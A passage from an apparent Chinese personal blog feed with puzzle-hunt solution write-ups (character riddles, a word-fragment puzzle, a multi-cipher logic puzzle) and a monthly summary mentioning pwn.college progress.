现在第一步做完了，接下来按照题目中说的连接局部就可以了，其实在填字的过程中也会发现有些相邻的字可以组成词语。连接的时候不用考虑方向，连成无向图即可。在连完后，连通的字与孤立的字表达的意思显而易见。</description>
      <content:encoded><![CDATA[
<div id="outline-container-headline-1" class="outline-2">
<h2 id="headline-1">
简介
</h2>
<div id="outline-text-headline-1" class="outline-text-2">
<p>这是一个小型的解谜活动，题目出在<a href="https://mp.weixin.qq.com/s/6Iw1aLHo1OkqGeOO5Tgj3A">微信公众号</a>上，比赛时间是3月29日晚8点到3月31日晚8点。一共也就两天时间，不过这次我们成功完赛了，在比赛结束前的80分钟。
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.1setb9vzq6.webp"/>
</figure>

这次的题目主题很明确，都和美术艺术有关，而且难度适中，没有讨厌的谐音梗网络梗，每道题基本上都需要两步以上才能得到最终答案。通过这次活动欣赏到了许多著名艺术作品。</p>
</div>
</div>
<div id="outline-container-headline-2" class="outline-2">
<h2 id="headline-2">
第一题 细密画
</h2>
<div id="outline-text-headline-2" class="outline-text-2">
<p>这幅细密画颇有异域风情，画家细细描绘每一个场景。传说只有正确地连接局部，才能揭开画作的真正面貌……
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.2h82vblx64.webp"/>
</figure>

都是一些字谜</p>
<div id="outline-container-headline-3" class="outline-3">
<h3 id="headline-3">
第一排
</h3>
<div id="outline-text-headline-3" class="outline-text-3">
<ol>
<li>虚线内的格子应填入相同的形状，只是角度不同，易得“浮”字</li>
<li>倜傥和隽永部分合在一起，为“雕”字</li>
<li>单人旁和象组合成“像”字</li>
<li>口里有个冬，为“图”字</li>
<li>下面的横杠为减的意思，六七指的是笔画的第六七画，减去后得到“纹”</li>
<li>一个有两个读音的多音字，为“乐”</li>
<li>成语是双管齐下，为“管”</li>
<li>墨汁减去土，剩下为“黑”</li>
</ol>
</div>
</div>
<div id="outline-container-headline-4" class="outline-3">
<h3 id="headline-4">
第二排
</h3>
<div id="outline-text-headline-4" class="outline-text-3">
<ol>
<li>金木水火土少了“木”</li>
<li>一个反的片，片加反为“版”</li>
<li>蓝色的线开始没想到什么意思，后来想到了是镜面，镜像补全后为“画”</li>
<li>成语是两肋插刀，为“插”</li>
<li>把数字和图画都转换成汉字，十十亻七为“花”字</li>
<li>这个是最后一个想到的，一开始以为是这个字是什么目，其实就是目眩来表示眼睛发花，图中少的部分拼到一起为“弦”</li>
<li>多音字，为“和”</li>
<li>箭头右边繁体字比简体字多出来的部分，找到这个字为“声”，繁体字是聲</li>
</ol>
</div>
</div>
<div id="outline-container-headline-5" class="outline-3">
<h3 id="headline-5">
第三排
</h3>
<div id="outline-text-headline-5" class="outline-text-3">
<ol>
<li>箭头右边为运算符号相似的汉字，减号即为“一”字</li>
<li>镜像补全后为“宣”</li>
<li>就是个“纸”字，图片没其它意思。。</li>
<li>黄色方框和下面的方框有双箭头连结，下面弓箭加豆为短，短相反为长，弓加长为“张”</li>
<li>搜索易得“恭”</li>
<li>琴瑟，取“琴”字</li>
<li>土字去掉第三画，为“十”</li>
<li>左边的字都能与右边字组成ABAC形式的词，第三个是可歌可泣，问号是“歌”</li>
</ol>
</div>
</div>
<div id="outline-container-headline-6" class="outline-3">
<h3 id="headline-6">
第四排
</h3>
<div id="outline-text-headline-6" class="outline-text-3">
<ol>
<li>阔别，图中少了舌和刂，组成“刮”</li>
<li>这个图解释了遇到减数字应该怎么做，刃去掉第三画为“刀”</li>
<li>四排二列是刀，上面加上前为“剪”</li>
<li>车口耳组成“辑”</li>
<li>迅速的交集，即相同的部分为辶，铭和奖相同的部分为夕，四排七列倒过来为罒，组成“逻”</li>
<li>镜像补全后为“曲”</li>
<li>目和眼意思相同，问号为“目”</li>
<li>肥皂剧是电视剧，问号为“剧”</li>
</ol>
</div>
</div>
<div id="outline-container-headline-7" class="outline-3">
<h3 id="headline-7">
第五排
</h3>
<div id="outline-text-headline-7" class="outline-text-3">
<ol>
<li>二排一列为木，四排七列为目，组成“相”</li>
<li>蓝分成上中下三部分，取中间的部分下面加上见，为“览”</li>
<li>伞去掉三四五画为“个”</li>
<li>西二小，组成“票”</li>
<li>扌石组成“拓”</li>
<li>十十豆又组成“鼓”</li>
<li>学去掉一三画为“字”</li>
<li>这个一开始我以为右下角是一寸照片，后来猜想到一横还是减号，是冠减去寸，和耳丶组成“院”</li>
</ol>
</div>
</div>
<div id="outline-container-headline-8" class="outline-3">
<h3 id="headline-8">
第六排
</h3>
<div id="outline-text-headline-8" class="outline-text-3">
<ol>
<li>二十为廿，两个倒过来组成“册”</li>
<li>易得“博”</li>
<li>这里说明了双箭头代表反义，黄色区域里是相同的部分为八，父和公的反义都为母</li>
<li>甲倒过来，加上耳为“邮”</li>
<li>山东简称鲁，去掉日为“鱼”</li>
<li>星空又名星月夜，月加空为“腔”</li>
<li>五个口，注意连结部分，组成“唱”</li>
<li>反战，图中少了又戈，组成“戏”</li>
</ol>
<p>现在第一步做完了，接下来按照题目中说的连接局部就可以了，其实在填字的过程中也会发现有些相邻的字可以组成词语。连接的时候不用考虑方向，连成无向图即可。在连完后，连通的字与孤立的字表达的意思显而易见。</p>
</div>
</div>
</div>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>三月总结</title>
      <link>https://wind1900.github.io/ctf/%E4%B8%89%E6%9C%88%E6%80%BB%E7%BB%93/</link>
      <pubDate>Mon, 01 Apr 2024 00:00:00 +0000</pubDate>
      <guid>https://wind1900.github.io/ctf/%E4%B8%89%E6%9C%88%E6%80%BB%E7%BB%93/</guid>
      <description>摘要 三月的大部分时间都花在了两个兴趣上，而因此容易废寝忘食&#xA;总结 月初和月底分别参加了两个puzzle hunt活动，一次差一点完赛，一次在最后时刻完赛 另外在pwncollege拿到了绿带，还剩最后的蓝带了 两则趣事 有一天正在做题的时候，终端突然出现了一堆乱码，什么命令都没有反应，像是服务器中病毒了一样。后来发现好像是在播放一个视频，有熟悉的Yan的房间，还有一些红字，写的1,000,000 Solves&#xA;后来才知道，原来是平台达到了一百万次成功提交进行的庆祝，而这第一百万次，应该是我触发的。为什么这么说呢，Yan发了一条状态说道&amp;#34;The millionth flag was from level 84 of the Program Interaction module&amp;#34;，这正是我当时正在刷的题，而且是从后往前做，做的速度特别快。相当于中了次彩票 绿带最后的题目都有一些难度，因此我会去discord里看看其他人的讨论，有一次无意中浏览到私聊信息，发现竟然有人给我留言，是问之前的题目的（据说是从最近做题记录上找到的我），但已经是五天前的了。没想到在网上还能认识新朋友，后来与这位外国友人交流了很多题目。本来想着拿到蓝带以后再去帮忙解答问题，现在就能帮到别人，也是非常开心的&#xA;计划 接下来重心要放在找工作相关的，不能把全部时间用去做题了，不过还是希望能在六月拿到蓝带，再试着参加一些比赛并随缘找队友&#xA;结语 植树节也在三月，大概是这个时候适合种树吧，那么种树第二好的时间是什么时候呢？</description>
      <content:encoded><![CDATA[
<div id="outline-container-headline-1" class="outline-2">
<h2 id="headline-1">
摘要
</h2>
<div id="outline-text-headline-1" class="outline-text-2">
<p>三月的大部分时间都花在了两个兴趣上，而因此容易废寝忘食</p>
</div>
</div>
<div id="outline-container-headline-2" class="outline-2">
<h2 id="headline-2">
总结
</h2>
<div id="outline-text-headline-2" class="outline-text-2">
<p>月初和月底分别参加了两个puzzle hunt活动，一次差一点完赛，一次在最后时刻完赛
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.syourrvax.webp"/>
</figure>

<figure><img src="https://wind1900.github.io/picx-images-hosting/image.1setb9vzq6.webp"/>
</figure>

另外在pwncollege拿到了绿带，还剩最后的蓝带了
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.8s32tt1vof.webp"/>
</figure>
</p>
</div>
</div>
<div id="outline-container-headline-3" class="outline-2">
<h2 id="headline-3">
两则趣事
</h2>
<div id="outline-text-headline-3" class="outline-text-2">
<p>有一天正在做题的时候，终端突然出现了一堆乱码，什么命令都没有反应，像是服务器中病毒了一样。后来发现好像是在播放一个视频，有熟悉的Yan的房间，还有一些红字，写的1,000,000 Solves</p>
<p>
后来才知道，原来是平台达到了一百万次成功提交进行的庆祝，而这第一百万次，应该是我触发的。为什么这么说呢，Yan发了一条<a href="https://defcon.social/@Zardus/111865419819488221">状态</a>说道&#34;The millionth flag was from level 84 of the Program Interaction module&#34;，这正是我当时正在刷的题，而且是从后往前做，做的速度特别快。相当于中了次彩票
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.sypyqzlnc.webp"/>
</figure>

<figure><img src="https://wind1900.github.io/picx-images-hosting/eefdbf4c2d318506f863715cefca7fa.9kfybjt5eg.webp"/>
</figure>
</p>
<p>
绿带最后的题目都有一些难度，因此我会去discord里看看其他人的讨论，有一次无意中浏览到私聊信息，发现竟然有人给我留言，是问之前的题目的（据说是从最近做题记录上找到的我），但已经是五天前的了。没想到在网上还能认识新朋友，后来与这位外国友人交流了很多题目。本来想着拿到蓝带以后再去帮忙解答问题，现在就能帮到别人，也是非常开心的</p>
</div>
</div>
<div id="outline-container-headline-4" class="outline-2">
<h2 id="headline-4">
计划
</h2>
<div id="outline-text-headline-4" class="outline-text-2">
<p>接下来重心要放在找工作相关的，不能把全部时间用去做题了，不过还是希望能在六月拿到蓝带，再试着参加一些比赛并随缘找队友</p>
</div>
</div>
<div id="outline-container-headline-5" class="outline-2">
<h2 id="headline-5">
结语
</h2>
<div id="outline-text-headline-5" class="outline-text-2">
<p>植树节也在三月，大概是这个时候适合种树吧，那么种树第二好的时间是什么时候呢？</p>
</div>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>江湖解谜总结四</title>
      <link>https://wind1900.github.io/puzzlehunt/%E6%B1%9F%E6%B9%96%E8%A7%A3%E8%B0%9C%E6%80%BB%E7%BB%93%E5%9B%9B/</link>
      <pubDate>Wed, 13 Mar 2024 00:00:00 +0000</pubDate>
      <guid>https://wind1900.github.io/puzzlehunt/%E6%B1%9F%E6%B9%96%E8%A7%A3%E8%B0%9C%E6%80%BB%E7%BB%93%E5%9B%9B/</guid>
      <description>这应该是这次总结的最后一道题了，第三部分的其它题要么太难要么太简单。这道题是和队友一起做的，主要时间花在了搜索和填词，整个思路比较有意思&#xA;门生擂台 经文残本 这是散落各处的经文残本。相传，为了保守其中蕴藏的秘密，弟子们将全卷拆开后，留下了一部分用以相互印证&#xA;封面 动物 国家 美国州 古罗马军事家 布拉德·皮特主演电影 群岛 西班牙省份 日本料理 幻之宝可梦 航天器 体育项目 文学名著 披头士歌曲 仪器 碎片 AND ER GA GE GONE HIP I IALA INGBE IPPI ISLANDDS JIKIS K L LLI MA MI MOMET N ND R RAGO S S SA SMAR SSMITH SU TAL TAMUS TH THTHE YA 这个题就是用下面的碎片组词，最后正好可以拼成14个单词对应上面的14个类型。最开始的时候可以选择比较简单的封面或者碎片，比如布拉德·皮特主演电影，JIKIS，TAMUS 电影是Mr. &amp;amp; Mrs. Smith，碎片里有SSMITH，但是却找不到前面的Mr &amp;amp; Mr。另外用搜词网站https://nutrimatic.org/ 搜索JIKIS最有可能的词是国家tajikistan，碎片里却找不到两边的ta和tan。而搜索TAMUS出来最有可能的是动物hippopotamus，碎片里还有HIP，少了popo 这时候尝试把少的部分也都列出来，结果突然发现&#xA;封面 单词 碎片 缺少部分 动物 hippopotamus HIP TAMUS popo 国家 tajikistan JIKIS ta tan 美国州 mississippi MI IPPI ssiss 布拉德·皮特主演电影 Mr.</description>
      <content:encoded><![CDATA[
<p>这应该是这次总结的最后一道题了，第三部分的其它题要么太难要么太简单。这道题是和队友一起做的，主要时间花在了搜索和填词，整个思路比较有意思</p>
<div id="outline-container-headline-1" class="outline-2">
<h2 id="headline-1">
门生擂台
</h2>
<div id="outline-text-headline-1" class="outline-text-2">
<div id="outline-container-headline-2" class="outline-3">
<h3 id="headline-2">
经文残本
</h3>
<div id="outline-text-headline-2" class="outline-text-3">
<p>这是散落各处的经文残本。相传，为了保守其中蕴藏的秘密，弟子们将全卷拆开后，留下了一部分用以相互印证</p>
<div id="outline-container-headline-3" class="outline-4">
<h4 id="headline-3">
封面
</h4>
<div id="outline-text-headline-3" class="outline-text-4">
<ul>
<li>动物</li>
<li>国家</li>
<li>美国州</li>
<li>古罗马军事家</li>
<li>布拉德·皮特主演电影</li>
<li>群岛</li>
<li>西班牙省份</li>
<li>日本料理</li>
<li>幻之宝可梦</li>
<li>航天器</li>
<li>体育项目</li>
<li>文学名著</li>
<li>披头士歌曲</li>
<li>仪器</li>
</ul>
</div>
</div>
<div id="outline-container-headline-4" class="outline-4">
<h4 id="headline-4">
碎片
</h4>
<div id="outline-text-headline-4" class="outline-text-4">
<table>
<tbody>
<tr>
<td>AND</td>
<td>ER</td>
<td>GA</td>
<td>GE</td>
<td>GONE</td>
<td>HIP</td>
<td>I</td>
</tr>
<tr>
<td>IALA</td>
<td>INGBE</td>
<td>IPPI</td>
<td>ISLANDDS</td>
<td>JIKIS</td>
<td>K</td>
<td>L</td>
</tr>
<tr>
<td>LLI</td>
<td>MA</td>
<td>MI</td>
<td>MOMET</td>
<td>N</td>
<td>ND</td>
<td>R</td>
</tr>
<tr>
<td>RAGO</td>
<td>S</td>
<td>S</td>
<td>SA</td>
<td>SMAR</td>
<td>SSMITH</td>
<td>SU</td>
</tr>
<tr>
<td>TAL</td>
<td>TAMUS</td>
<td>TH</td>
<td>THTHE</td>
<td>YA</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>
这个题就是用下面的碎片组词，最后正好可以拼成14个单词对应上面的14个类型。最开始的时候可以选择比较简单的封面或者碎片，比如布拉德·皮特主演电影，JIKIS，TAMUS <br>
电影是Mr. &amp; Mrs. Smith，碎片里有SSMITH，但是却找不到前面的Mr &amp; Mr。另外用搜词网站<a href="https://nutrimatic.org/">https://nutrimatic.org/</a> 搜索JIKIS最有可能的词是国家tajikistan，碎片里却找不到两边的ta和tan。而搜索TAMUS出来最有可能的是动物hippopotamus，碎片里还有HIP，少了popo <br>
这时候尝试把少的部分也都列出来，结果突然发现</p>
<table>
<tbody>
<tr>
<td>封面</td>
<td>单词</td>
<td>碎片</td>
<td>缺少部分</td>
</tr>
<tr>
<td>动物</td>
<td>hippopotamus</td>
<td>HIP TAMUS</td>
<td>popo</td>
</tr>
<tr>
<td>国家</td>
<td>tajikistan</td>
<td>JIKIS</td>
<td>ta tan</td>
</tr>
<tr>
<td>美国州</td>
<td>mississippi</td>
<td>MI IPPI</td>
<td>ssiss</td>
</tr>
<tr>
<td>布拉德·皮特主演电影</td>
<td>Mr. &amp; Mrs. Smith</td>
<td>SSMITH</td>
<td>Mr. &amp; Mr</td>
</tr>
</tbody>
</table>
<p>缺少的部分应该都是两个字母重复两次！碎片里还有N，AND和I可以放在上面使它们满足条件。于是按照这个规律继续搜索下面的每个分类，找的过程中我发现把wiki的文本全部复制下来再用正则表达式匹配比人工找快多了。最后填的结果如下</p>
<table>
<tbody>
<tr>
<td>封面</td>
<td>单词</td>
<td>碎片</td>
<td>缺少部分</td>
</tr>
<tr>
<td>动物</td>
<td>hippopotamus</td>
<td>HIP TAMUS</td>
<td>popo</td>
</tr>
<tr>
<td>国家</td>
<td>tajikistan</td>
<td>JIKIS N</td>
<td>ta ta</td>
</tr>
<tr>
<td>美国州</td>
<td>mississippi</td>
<td>MI I IPPI</td>
<td>ss ss</td>
</tr>
<tr>
<td>古罗马军事家</td>
<td>Gaius Marius</td>
<td>GA SMAR S</td>
<td>iu iu</td>
</tr>
<tr>
<td>布拉德·皮特主演电影</td>
<td>Mr. &amp; Mrs. Smith</td>
<td>AND SSMITH</td>
<td>mr mr</td>
</tr>
<tr>
<td>群岛</td>
<td>ryukyu Islands</td>
<td>R K ISLANDS</td>
<td>yu yu</td>
</tr>
<tr>
<td>西班牙省份</td>
<td>Zaragoza</td>
<td>RAGO</td>
<td>za za</td>
</tr>
<tr>
<td>日本料理</td>
<td>Sukiyaki</td>
<td>SU YA</td>
<td>ki ki</td>
</tr>
<tr>
<td>幻之宝可梦</td>
<td>Melmetal</td>
<td>L TAL</td>
<td>me me</td>
</tr>
<tr>
<td>航天器</td>
<td>satellite</td>
<td>SA LLI</td>
<td>te te</td>
</tr>
<tr>
<td>体育项目</td>
<td>martial arts</td>
<td>MA IALA S</td>
<td>rt rt</td>
</tr>
<tr>
<td>文学名著</td>
<td>Gone with the wind</td>
<td>GONE THTHE ND</td>
<td>wi wi</td>
</tr>
<tr>
<td>披头士歌曲</td>
<td>Getting Better</td>
<td>GE INGBE ER</td>
<td>tt tt</td>
</tr>
<tr>
<td>仪器</td>
<td>thermometer</td>
<td>TH MOMET</td>
<td>er er</td>
</tr>
</tbody>
</table>
<p>下一步呢，把缺少的两个字母都连起来，发现可以组成四个词potassimu，ryuzaki，meter，twitter，这几个词都有一个字母可以与其对应：KLMX <br>
本以为做到这就结束了，没想到提交答案得到回复目前为止完全正确，继续加油。接下来应该做什么，联想到这道题的规律，应该是在KLMX里重复两次填入两个字母，搜索后得到Karl Marx，提交后正确</p>
<p>
最后再把致谢链接放在这里吧 <a href="https://jh2024.jianghujiemi.fun/victory">https://jh2024.jianghujiemi.fun/victory</a></p>
</div>
</div>
</div>
</div>
</div>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>江湖解谜总结三</title>
      <link>https://wind1900.github.io/puzzlehunt/%E6%B1%9F%E6%B9%96%E8%A7%A3%E8%B0%9C%E6%80%BB%E7%BB%93%E4%B8%89/</link>
      <pubDate>Sat, 09 Mar 2024 00:00:00 +0000</pubDate>
      <guid>https://wind1900.github.io/puzzlehunt/%E6%B1%9F%E6%B9%96%E8%A7%A3%E8%B0%9C%E6%80%BB%E7%BB%93%E4%B8%89/</guid>
      <description>玉虚宫练武 大通灵师 &amp;#34;zl anzr vf ovonv. guvf vf gur zrffntr ba orunys bs gur grfgref. nyy bs bhe zrffntrf ner pnrfne-fuvsgrq, qrfcvgr fbzr znl or gura pvcurerq hfvat ivtrarer. v yvxr cevzr ahzoref, naq zl vq vf bar bs gurz. fnqyl, zl cny nakvnb&amp;#39;f vf abg.&amp;#34;&#xA;w wacz hz hmo aj nabsywjz ypq ai aj xsqccalz qthzzf. qmf aonl, gpf ymewsc lzmsp sfy hsw kgoncwm sluz gcgwk wwysjt cc kwhoazgms.</description>
      <content:encoded><![CDATA[
<div id="outline-container-headline-1" class="outline-2">
<h2 id="headline-1">
玉虚宫练武
</h2>
<div id="outline-text-headline-1" class="outline-text-2">
<div id="outline-container-headline-2" class="outline-3">
<h3 id="headline-2">
大通灵师
</h3>
<div id="outline-text-headline-2" class="outline-text-3">
<p>&#34;zl anzr vf ovonv. guvf vf gur zrffntr ba orunys bs gur grfgref. nyy bs bhe zrffntrf ner pnrfne-fuvsgrq, qrfcvgr fbzr znl or gura pvcurerq hfvat ivtrarer. v yvxr cevzr ahzoref, naq zl vq vf bar bs gurz. fnqyl, zl cny nakvnb&#39;f vf abg.&#34;</p>
<hr>
<p><figure><img src="https://wind1900.github.io/picx-images-hosting/image.b8ndd9bx2.webp"/>
</figure>

w wacz hz hmo aj nabsywjz ypq ai aj xsqccalz qthzzf. qmf aonl, gpf ymewsc lzmsp sfy hsw kgoncwm sluz gcgwk wwysjt cc kwhoazgms. mml d tzjyzh hzaxv tk ocwnz. xpb qsuo hhg, lcfpw ga hsw lzoxesosd khzov xjzbnz jzowdq rswd. zjkpnwm, hswq ycy&#39;l ddyp egmgp ugys. dhwvytfy jt xgjns, ezw hcckw gcgwj ispvk oc fkw ovp ughdflwm rfjaiu ewko gzdnz, pfl fpamwj awgw vjsdf&#39;l.</p>
<hr>
<p>c ug nby lcxxfy aoymmyl, uhx sym, c mjyue zlyhwb. c ug lyuffs mfijjs qcnb gs mjlyuxmbyyn. nbun&#39;m qbs c ume nby mjlyuxmbyyn guhuayl ni mupy nbcm gymmuay. cm cn ylsoy il nbun xoxy qcnb cx hogvyl nqi? c&#39;g hin moly. mjyuecha iz cxm, gs cx cm mguffyl nbuh nby mfuweyl, uhx nby vlucffy yhnbomcumn bum u alyunyl cx nbuh vinb. qyff, nby yhnbomcumnm uly chnylymncha. ylsoy fipym u wcjbyl qcnb xin, von uhrcui xiymh&#39;n.</p>
<hr>
<p><figure><img src="https://wind1900.github.io/picx-images-hosting/image.3raz5gjsos.webp"/>
</figure>

eky, z&#39;qy jhqydu qlus tkzyk uj dkcuhe sydg ud vhqdsu, s&#39;uij fekhgkey deki fqhbedi jhui ryud vhqdsqyi. kdu qdusteju qckiqdju: xyuh, dejhu fhewhqccukh uj sxudxk iedj iehjyi tyduh, uj ybi edj jeki tukn tusytu tu cetyvyuh sxqskd tu bukhi junjui t&#39;kd cedjqdj ugkylqbudj q bukh fhefhu yt fbki bu fhyn t&#39;kdu fehjyed ceouddu tu hqcud tu bqdpxek.</p>
<hr>
<div class="src src-python">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">key</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> potpal[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]</span></span></code></pre></div>
</div>
<p>z gh sbvk vmnamrshdl. rvrg, h bzrxy xynkkmcut knvs vzkczdh xykigo&#39;n zj vmx oyk nkuxbkm&#39;r cy, ftz hm oyk htfozvgd ia knz nncvx. jtl pjkm muhv on nom wghhft eghd imukmdx vcvczvzkoxzfgp. vvrmrfxy hm hp bdfyivxz jyt. rrg hh gfczq wvjk.</p>
</div>
</div>
<div id="outline-container-headline-3" class="outline-3">
<h3 id="headline-3">
解题思路
</h3>
<div id="outline-text-headline-3" class="outline-text-3">
<p>遇到乱码不用慌，可以先用<a href="https://www.quipqiup.com/">https://www.quipqiup.com/</a> 看看能不能解出什么。果然可以得到</p>
<ul>
<li>my name is bibai. this is the message on behalf of the testers. all of our messages are caesar-shifted, despite some may be then ciphered using vigenere. i like prime numbers, and my id is one of them. sadly, my pal anxiao&#39;s is not.</li>
</ul>
<p>根据这段话我们能得到题目中的文字被分成五段话，它们都是用的凯撒密码或者维吉尼亚密码加密，还有一些队友的信息。</p>
<p>
第二段的图里是猪圈密码，猪圈密码解出来&#34;KEY HELLO&#34;，再尝试用hello作为维吉尼亚密钥替换原文后使用凯撒解得</p>
<ul>
<li>i like to put my vigenere key in my favorite cipher. fun fact, our number three and the slacker each loves binary or semaphore. but I forget which is which. fun fact two, three of the teammates speak french really well. however, they don&#39;t like morse code. speaking of morse, the morse lover needs to use the computer during test solve, but number five doesn&#39;t.</li>
</ul>
<p>第三段的文字直接使用凯撒解得</p>
<ul>
<li>i am the riddle guesser, and yes, i speak french. i am really sloppy with my spreadsheet. that&#39;s why i ask the spreadsheet manager to save this message. Is it eryue or that dude with id number two? i&#39;m not sure. speaking of ids, my id is smaller than the slacker, and the braille enthusiast has a greater id than both. well, the enthusiasts are interesting. eryue loves a cipher with dot, but anxiao doesn&#39;t.</li>
</ul>
<p>第四段先翻译图片中的旗语，得到foreign language。而第二段里说过有队友是说法语的，果然这段文字所有的凯撒解码都不是英文，对所有的结果尝试翻译后得到只有一个正确的</p>
<ul>
<li>yes, I hung out with dujiu and number five in France, that&#39;s why we speak French very well. a funny story: yesterday, our programmer and chenhu went out to dinner, and they both decided to modify each of their texts by an amount equivalent to their own id plus the price of an average serving of lanzhou ramen.</li>
</ul>
<p>第五段有个像是python的代码，[::-1] 就是将前面的字符串倒序，算是得到了laptop，使用laptop当维吉尼亚密钥解码后再凯撒移位得到</p>
<ul>
<li>i am that programmer. well, i heard yesterday that between chenhu&#39;s id and the slacker&#39;s id, one is the multiple of the other. our user name is our family name ordered alphabetically. password is my vigenere key. all in lower case.</li>
</ul>
<p>这道题最下面开始有个登录界面，根据这五段话可以得到五个队员的名字，用户名是五个人的姓连起来，密码是laptop，输入后得到一个新的选择题，需要解出每个队员的ID，分工和加密偏好才能答对
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.8dwm66vedg.webp"/>
</figure>

这个就是一道逻辑题了，总结上面五段话的信息我们可以得到：</p>
<ul>
<li>总共有五个队员，姓名为anxiao，bibai，chenhu，dujiu，eryue</li>
<li>五个队员角色分别为队长（captain），划水怪（slacker），猜谜王（riddle guesser），文档管理（spreadsheet manager），程序佬（programmer）</li>
<li>五个队员喜欢的密码有猪圈，摩斯，盲文，旗语，二进制</li>
<li>第一个说话的是bibai，bibai的id是质数</li>
<li>anxiao的id不是质数</li>
<li>第二个说话的人喜欢猪圈密码</li>
<li>id为3的人和划水怪两个人喜欢的密码在旗语和二进制中</li>
<li>三个说法语的队友不喜欢摩斯密码</li>
<li>喜欢摩斯密码的人需要使用电脑解谜，id为5的人不用电脑解谜</li>
<li>第三个说话的人是猜谜王，说法语</li>
<li>猜谜王的id比划水怪的小，喜欢盲文的人的id比猜谜王和划水怪都要大</li>
<li>文档管理是eryue或者id是2</li>
<li>eryue喜欢的密码中有点，anxiao喜欢的密码中没有点</li>
<li>第四个说话的人也说法语，另两个是dujiu和id为5的人。</li>
<li>程序佬和chenhu在加密后又凯撒移位了密码（即第二段和第四段话），且位移量都是他们的id加上一个固定值</li>
<li>第五个说话的人是程序佬</li>
<li>chenghu的id和划水怪的id其中一个是另一个的倍数</li>
</ul>
<p>另外这是五段消息的加密方式，注意加密的偏移量并不等于解密用的偏移量，二者相加为26</p>
<table>
<tbody>
<tr>
<td>偏移13</td>
</tr>
<tr>
<td>hello加密后偏移7</td>
</tr>
<tr>
<td>偏移20</td>
</tr>
<tr>
<td>偏移16</td>
</tr>
<tr>
<td>laptop加密后偏移6</td>
</tr>
</tbody>
</table>
<p>
最终可以解出所有的信息，这里仅给出部分结果</p>
<table>
<tbody>
<tr>
<td class="align-right">ID</td>
<td>话</td>
<td>姓名</td>
<td>分工</td>
<td>加密偏好</td>
</tr>
<tr>
<td class="align-right">1</td>
<td></td>
<td></td>
<td>程序佬</td>
<td></td>
</tr>
<tr>
<td class="align-right">2</td>
<td>第二段</td>
<td>chenhu</td>
<td></td>
<td></td>
</tr>
<tr>
<td class="align-right">3</td>
<td>第三段</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td class="align-right">4</td>
<td>第四段</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td class="align-right">5</td>
<td></td>
<td>bibai</td>
<td></td>
<td>盲文</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>江湖解谜总结二</title>
      <link>https://wind1900.github.io/puzzlehunt/%E6%B1%9F%E6%B9%96%E8%A7%A3%E8%B0%9C%E6%80%BB%E7%BB%93%E4%BA%8C/</link>
      <pubDate>Thu, 07 Mar 2024 00:00:00 +0000</pubDate>
      <guid>https://wind1900.github.io/puzzlehunt/%E6%B1%9F%E6%B9%96%E8%A7%A3%E8%B0%9C%E6%80%BB%E7%BB%93%E4%BA%8C/</guid>
      <description>玉虚宫练武 赛博记录员 人工智障模仿人类的第一步——学会写周记。 这道题一开始就是做第一张图里的填空，然后按问号位置提取出字母，填不出所有的也没关系，大致可以猜到结果是什么，比如我最开始能填出来的只有这些&#xA;答案 字母 ? fifa world cup i pleasant goat and big big wolf l arknights i Joshua Barkman b ? ? luckin coffee i jvr music s youth with you w ? league of legends e KFC k ? ? 猜测这些字母组成bilibili&amp;#39;s weekly，而B站确实有个每周必看，但是怎么和下面的图联系起来呢？&#xA;观察图片中的相似处，每个图都有个四位数，像是日期，也都有一个分数，分母都是10。B站视频的id都是十位，那这个分数可能就是用来ID提取，日期有可能是视频的日期，也可能是每周必看的日期，找到每周必看后先找封面是这些图片的视频再找到ID。&#xA;搜索过程中发现，每期必看都在周五更新，而且都有个标题。我第一个尝试的是左下角的图片，8月23日对应的只有第22期，在2019年8月23日更新的，标题是霸道总裁黄晓明。进去看到第一个视频的封面就和题里的十分相似，于是可以明确四位数就是更新日期，再从视频列表中找出相似的原封面和对应视频ID。而这个标题也让我想到第一张图里一个还没填的“今天在某部真人秀里学到了一句强势拒绝别人指手画脚的话呢”，原来下面的视频封面，或者说每周必看标题，也都和上面的答案有关系！&#xA;这样找到所有日期对应的每周必看，通过标题联系到第一张图里每一行并可以填完剩余空格，再找到视频ID，按照图一问题的顺序提取就能得到最终结果。&#xA;不过找相似图片的过程并不是很顺利，有些很难找到到底哪个是原图，比如： 后来队友发现了一个好方法，把眼镜摘掉再看，AI生成的图和原图看起来就一模一样。最终结果就不放出来了，有兴趣的可以试试找这几个图0113，0603，0708，0908。</description>
      <content:encoded><![CDATA[
<div id="outline-container-headline-1" class="outline-2">
<h2 id="headline-1">
玉虚宫练武
</h2>
<div id="outline-text-headline-1" class="outline-text-2">
<div id="outline-container-headline-2" class="outline-3">
<h3 id="headline-2">
赛博记录员
</h3>
<div id="outline-text-headline-2" class="outline-text-3">
<p>人工智障模仿人类的第一步——学会写周记。
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.4jnuk7mx04.webp"/>
</figure>

<figure><img src="https://wind1900.github.io/picx-images-hosting/extraction[1].60tzlyseea.webp"/>
</figure>
</p>
<p>
这道题一开始就是做第一张图里的填空，然后按问号位置提取出字母，填不出所有的也没关系，大致可以猜到结果是什么，比如我最开始能填出来的只有这些</p>
<table>
<thead>
<tr>
<th>答案</th>
<th>字母</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td>?</td>
</tr>
<tr>
<td>fifa world cup</td>
<td>i</td>
</tr>
<tr>
<td>pleasant goat and big big wolf</td>
<td>l</td>
</tr>
<tr>
<td>arknights</td>
<td>i</td>
</tr>
<tr>
<td>Joshua Barkman</td>
<td>b</td>
</tr>
<tr>
<td></td>
<td>?</td>
</tr>
<tr>
